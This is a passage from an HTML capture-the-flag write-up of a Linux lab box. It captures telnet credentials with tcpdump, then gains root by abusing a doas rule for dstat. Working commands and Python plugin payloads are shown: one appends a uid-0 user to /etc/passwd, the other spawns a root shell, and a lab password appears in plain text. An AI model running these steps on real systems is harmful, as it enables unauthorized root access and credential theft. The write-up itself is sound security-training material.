If we cound just see those network traffic then we can see the username and password what it is using as telnet uses plain text authentication.</p> <p>In linux there is a binary called <code>tcpdump</code> which will do exactly the thing that we wanted but we need sudo permission to run and we cant run <code>tcpdump</code> as sudo.</p> <p>But lets check if it might be marked as <code>suid binary</code></p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">ls</span> -la <span class="token variable"><span class="token variable">`</span><span class="token function">which</span> tcpdump<span class="token variable">`</span></span>
-rwxr-x--- <span class="token number">1</span> petrio capcap <span class="token number">1031784</span> Jan <span class="token number">24</span>  <span class="token number">2020</span> /usr/sbin/tcpdump
</code></pre></div><p>It was not market as suid either.</p> <p>Let's check if there is any special <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities" target="_blank" rel="noopener noreferrer">capabilities<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> for tcpdump.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ getcap -r <span class="token variable"><span class="token variable">`</span><span class="token function">which</span> tcpdump<span class="token variable">`</span></span>
/usr/sbin/tcpdump <span class="token operator">=</span> cap_net_admin,cap_net_raw+eip
</code></pre></div><p>It has <code>cap_net_admin</code> . So we can run it without root as well.</p> <p>So lets run tcpdump in one screen and in another screen lets run the <code>/opt/request.sh</code>.</p> <p>I like to analyisis network traffic using wireshark so I will save the output or tcpdump into out.pcap.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ tcpdump -i lo -w out.pcap
tcpdump: listening on lo, link-type EN10MB <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>, capture size <span class="token number">262144</span> bytes

</code></pre></div><p>Once we run the <code>request.sh</code> , move that out.pcap to you machine and analysis using wireshark.</p> <p>From that pcap file we got another credentials.
<code>servsau:s33rVSS@U</code></p> <h2 id="vertical-privilege-escalation">Vertical Privilege Escalation</h2> <p>Now that we got credentials for another user lets login as servsau.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>petrio@servsau:~$ <span class="token function">su</span> servsau
Password: 
servsau@servsau:/home/petrio$ 
</code></pre></div><p>After logging in I started enumerating and when I was checking the local binaries installed by the user i.e in <code>/usr/local/bin</code> I have found <code>doas</code> binary.
If you dont know about <a href="https://man.openbsd.org/doas" target="_blank" rel="noopener noreferrer">doas<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> then it allows you to run files being other users (as mentiond in the config file)</p> <p>Lets check the config of doas</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">cat</span> /usr/local/etc/doas.conf
permit nopass setenv <span class="token punctuation">{</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/tmp/home <span class="token punctuation">}</span> servsau as root cmd /usr/bin/dstat
</code></pre></div><p>From the config we get that <code>servsau</code> user can run <code>/usr/bin/dstat</code> as root.</p> <p>From the man page of <a href="https://man7.org/linux/man-pages/man1/pcp-dstat.1.html" target="_blank" rel="noopener noreferrer">dstat<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> , We can see that its just a simple binary to display the stat of the machine. But we can use customized plugins written in python and use it (we can use this feature to exploit this).</p> <p>But to run the plugins in <code>dstat</code> we have to place the python files in</p> <div class="language-bash extra-class"><pre class="language-bash"><code>~/.dstat/
<span class="token punctuation">(</span>path of binary<span class="token punctuation">)</span>/plugins/
/usr/share/dstat/
/usr/local/share/dstat/
</code></pre></div><p>except the user home directory non of the locations are writeable so we cannot add our custom plugin in those locations.</p> <p>But out user servsau doesn't have home directory</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">cat</span> /etc/passwd <span class="token operator">|</span> <span class="token function">grep</span> servsau
servsau:x:1003:1003:::/bin/bash
</code></pre></div><p>If we see the config file of doas again it set <code>HOME</code> to <code>/tmp/home/</code>. As /tmp is writable to all users we can create <code>home/.dstat</code> there and put our payload there.</p> <p>But there is a cron job that will delete <code>home</code> from /tmp every 30 seconds so we have to be quick on this.</p> <p>Now that we have everything lets see the skeleton code of plugin of dstat.
Here is the <code>helloworld</code> plugin of dstat.</p> <div class="language-py extra-class"><pre class="language-py"><code>$ cat <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>dstat<span class="token operator">/</span>dstat_helloworld<span class="token punctuation">.</span>py
<span class="token comment">### Author: Dag Wieers &lt;dag$wieers,com&gt;</span>

<span class="token keyword">class</span> <span class="token class-name">dstat_plugin</span><span class="token punctuation">(</span>dstat<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    Example &quot;Hello world!&quot; output plugin for aspiring Dstat developers.
    &quot;&quot;&quot;</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'plugin title'</span>
        self<span class="token punctuation">.</span>nick <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'counter'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span><span class="token builtin">vars</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'s'</span>
        self<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">12</span>
        self<span class="token punctuation">.</span>scale <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">def</span> <span class="token function">extract</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>val<span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Hello world!'</span>

<span class="token comment"># vim:ts=4:sw=4:et</span>
</code></pre></div><h3 id="how-i-approached">How I approached</h3> <p>I just overcomplicated the thing while solving for the first time but learnt 1 important thing so I wanted to share how I approaced this at first. Then later on I will show how you can do this easily as well.</p> <p>In <code>dstat</code> we can write the output of the program by using <code>-output</code> flag. So we can write anything as root. So I thought of writing my ssh key to <code>/root/.ssh/authorized_keys</code> and tried but it doesn't work as there was no <code>.ssh</code> folder in <code>/root/</code> directory.</p> <p>Next I think of writing to <code>/etc/sudoers</code> and give myself root permision but this also doesnt work. Because the output of the <code>dstat</code> has something like this in header and these lines broke the <code>/etc/sudoers</code></p> <div class="language- extra-class"><pre class="language-text"><code>&quot;Dstat 0.7.2 CSV output&quot;
&quot;Author:&quot;,&quot;Dag Wieers &lt;dag@wieers.com&gt;&quot;,,,,&quot;URL:&quot;,&quot;http://dag.wieers.com/home-made/dstat/&quot;
&quot;Host:&quot;,&quot;servsau&quot;,,,,&quot;User:&quot;,&quot;servsau&quot;
&quot;Cmdline:&quot;,&quot;dstat --output test&quot;,,,,&quot;Date:&quot;,&quot;08 Feb 2022 05:03:16 UTC&quot;
</code></pre></div><p>I was so frustrated at this moment and started tried to write every locations in linux filesystem which will upgrade my permissions. And it turned out those junks from the output of dstat won't break the <code>/etc/passwd</code>. So we can make new users with root permissions without any issues.</p> <p>Here is what I did to create new user.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ openssl <span class="token function">passwd</span> password
ICs0rmhf9Wuqw
</code></pre></div><p>Created a password for new user and edited the helloworld plugin like this.</p> <div class="language-py extra-class"><pre class="language-py"><code><span class="token keyword">class</span> <span class="token class-name">dstat_plugin</span><span class="token punctuation">(</span>dstat<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    Example &quot;Hello world!&quot; output plugin for aspiring Dstat developers.
    &quot;&quot;&quot;</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'plugin title'</span>
        self<span class="token punctuation">.</span>nick <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'counter'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span><span class="token builtin">vars</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'s'</span>
        self<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">12</span>
        self<span class="token punctuation">.</span>scale <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">def</span> <span class="token function">extract</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>val<span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'newroot:ICs0rmhf9Wuqw:0:0:root:/root:/bin/bash'</span>

<span class="token comment"># vim:ts=4:sw=4:et</span>
</code></pre></div><p>Now it will write <code>newroot:ICs0rmhf9Wuqw:0:0:root:/root:/bin/bash</code> to <code>/etc/passwd</code>  and create new user name <code>newroot</code> with password <code>password</code></p> <p>I saved the file as <code>dstat_exploit.py</code> in <code>/tmp</code> and used the following command</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token builtin class-name">cd</span> /tmp <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> home <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> home/.dstat <span class="token operator">&amp;&amp;</span> <span class="token function">cp</span> dstat_exploit.py home/.dstat/ <span class="token operator">&amp;&amp;</span> doas /usr/bin/dstat --exploit --output /etc/passwd

plugin-title
  counter   
newroot:ICs0rmhf9Wuqw:0:0:root:/root:/bin/bash
</code></pre></div><p>After that I closed the program and checked <code>/etc/passwd</code></p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">cat</span> /etc/passwd                        
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
petrio:x:1001:1001::/home/petrio:
mantaboy:x:1002:1002::/home/mantaboy:
servsau:x:1003:1003:::/bin/bash
baeker:x:1004:1004::/home/baeker:
bekcha:x:1005:1005::/home/bekcha:
telnetd:x:112:118::/nonexistent:/bin/false


<span class="token string">&quot;Host:&quot;</span>,<span class="token string">&quot;servsau&quot;</span>,,,,<span class="token string">&quot;User:&quot;</span>,<span class="token string">&quot;root&quot;</span>
<span class="token string">&quot;Cmdline:&quot;</span>,<span class="token string">&quot;dstat --exploit --output /etc/passwd&quot;</span>,,,,<span class="token string">&quot;Date:&quot;</span>,<span class="token string">&quot;08 Feb 2022 05:11:57 UTC&quot;</span>

<span class="token string">&quot;plugin title&quot;</span>
<span class="token string">&quot;counter&quot;</span>
newroot:ICs0rmhf9Wuqw:0:0:root:/root:/bin/bash
</code></pre></div><p>As you can see at the last line new user was created now we just have to do su newroot and get root.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">su</span> newroot
Password: password
root@servsau:/tmp<span class="token comment"># </span>
</code></pre></div><h3 id="easy-way">Easy way</h3> <p>I approached the box as mentioned above but later on realized that there is easy way to solve the box. Insted of creating the plugin and thinking of storing the output you can create a <code>dstat_exploit.py</code> in <code>/tmp/</code> with following content</p> <div class="language-py extra-class"><pre class="language-py"><code><span class="token keyword">import</span> pty
pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">'/bin/bash'</span><span class="token punctuation">)</span>
</code></pre></div><p>And then run the same command that I used before.</p> <div class="language- extra-class"><pre class="language-text"><code>servsau@servsau:/tmp$ cd /tmp &amp;&amp; mkdir home &amp;&amp; mkdir home/.dstat &amp;&amp; cp dstat_ok.py home/.dstat/ &amp;&amp; doas /usr/bin/dstat --ok
root@servsau:/tmp# 
</code></pre></div><p>And that's everything for this writeup. Hope you have learnt something from this . If you have any doubts you can send me a message at my <a href="https://twitter.com/0x4vian" target="_blank" rel="noopener noreferrer">twitter handler<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.f24e2c35.js" defer></script><script src="/assets/js/2.2a395b45.js" defer></script><script src="/assets/js/14.947a5956.js" defer></script>
  </body>
</html>
